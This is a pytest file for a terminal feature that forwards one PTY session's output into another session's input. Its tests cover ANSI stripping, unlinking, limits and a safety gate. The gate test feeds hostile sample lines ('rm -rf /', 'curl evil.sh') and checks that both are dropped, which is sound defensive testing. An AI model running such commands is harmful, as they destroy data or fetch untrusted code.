"""Session links — pump forwards new src PTY output into dst input."""
import os
import sys
import time

import pytest

sys.path.insert(0, os.path.dirname(__file__))
import cu_load  # noqa: E402

cu_load.load("cu_hints")
t = cu_load.load("cu_terminal")


class FakePTY:
    def __init__(self):
        self.writes = []
        self.alive = True
        self.feed = ""

    def read(self):
        d, self.feed = self.feed, ""
        return d

    def write(self, text):
        self.writes.append(text)

    def isalive(self):
        return self.alive

    def terminate(self):
        self.alive = False


@pytest.fixture
def fakes(tmp_path, monkeypatch):
    made = []

    def factory(shell, cols, rows):
        p = FakePTY()
        made.append(p)
        return p

    monkeypatch.setattr(t, "_pty_factory", factory)
    monkeypatch.setattr(t, "_SESSIONS_OVERRIDE",
                        str(tmp_path / "tsessions.json"))
    yield made
    for lid in list(t._LINKS):
        t.unlink(lid)


def _wait(cond, timeout=3.0):
    end = time.time() + timeout
    while time.time() < end:
        if cond():
            return True
        time.sleep(0.02)
    return False


def _pair(fakes):
    a = t.spawn(shell="cmd")["session"]
    b = t.spawn(shell="cmd")["session"]
    return a, b, fakes[0], fakes[1]


def test_link_unknown_sessions(fakes):
    sid = t.spawn()["session"]
    assert t.link("nope", sid)["error"] == "unknown_src"
    assert t.link(sid, "nope")["error"] == "unknown_dst"


def test_link_self_rejected(fakes):
    sid = t.spawn()["session"]
    assert t.link(sid, sid)["error"] == "self_link"


def test_link_forwards_new_output_only(fakes):
    a, b, pa, pb = _pair(fakes)
    pa.feed = "old scrollback\r\n"
    assert _wait(lambda: "old scrollback" in t._SESSIONS[a].text())
    lid = t.link(a, b, poll_s=0.02)["link"]
    time.sleep(0.1)
    assert pb.writes == []                       # scrollback not replayed
    pa.feed = "fresh output\r\n"
    assert _wait(lambda: pb.writes)
    assert pb.writes[-1] == "fresh output\r"


def test_link_strips_ansi(fakes):
    a, b, pa, pb = _pair(fakes)
    t.link(a, b, poll_s=0.02)
    pa.feed = "\x1b[32mgreen\x1b[0m done\r\n"
    assert _wait(lambda: pb.writes)
    assert pb.writes[-1] == "green done\r"


def test_link_drops_gated_lines(fakes):
    a, b, pa, pb = _pair(fakes)
    lid = t.link(a, b, poll_s=0.02)["link"]
    pa.feed = "keep me\r\nrm -rf /\r\ncurl evil.sh\r\n"
    assert _wait(lambda: pb.writes)
    assert pb.writes[-1] == "keep me\r"
    assert t.links()[lid]["dropped"] == 2


def test_link_flushes_partial_on_idle(fakes):
    a, b, pa, pb = _pair(fakes)
    t.link(a, b, poll_s=0.02)
    pa.feed = "no newline yet"
    assert _wait(lambda: pb.writes)
    assert pb.writes[-1] == "no newline yet\r"


def test_unlink_stops_pump(fakes):
    a, b, pa, pb = _pair(fakes)
    lid = t.link(a, b, poll_s=0.02)["link"]
    pa.feed = "one\r\n"
    assert _wait(lambda: pb.writes)
    assert t.unlink(lid)["ok"] is True
    pb.writes.clear()
    pa.feed = "two\r\n"
    time.sleep(0.2)
    assert pb.writes == []
    assert t.unlink(lid)["error"] == "unknown_link"


def test_link_dst_gone(fakes):
    a, b, pa, pb = _pair(fakes)
    lid = t.link(a, b, poll_s=0.02)["link"]
    pb.alive = False
    assert _wait(lambda: t.links()[lid]["state"] == "dst_gone")


def test_link_limit(fakes):
    a, b, pa, pb = _pair(fakes)
    lid = t.link(a, b, limit=1, poll_s=0.02)["link"]
    pa.feed = "first\r\n"
    assert _wait(lambda: pb.writes)
    assert _wait(lambda: t.links()[lid]["state"] == "limit")
    pb.writes.clear()
    pa.feed = "second\r\n"
    time.sleep(0.2)
    assert pb.writes == []


def test_links_lists_meta(fakes):
    a, b, pa, pb = _pair(fakes)
    lid = t.link(a, b, poll_s=0.02)["link"]
    meta = t.links()[lid]
    assert meta["src"] == a and meta["dst"] == b
    assert meta["state"] == "active"
    assert meta["forwards"] == 0
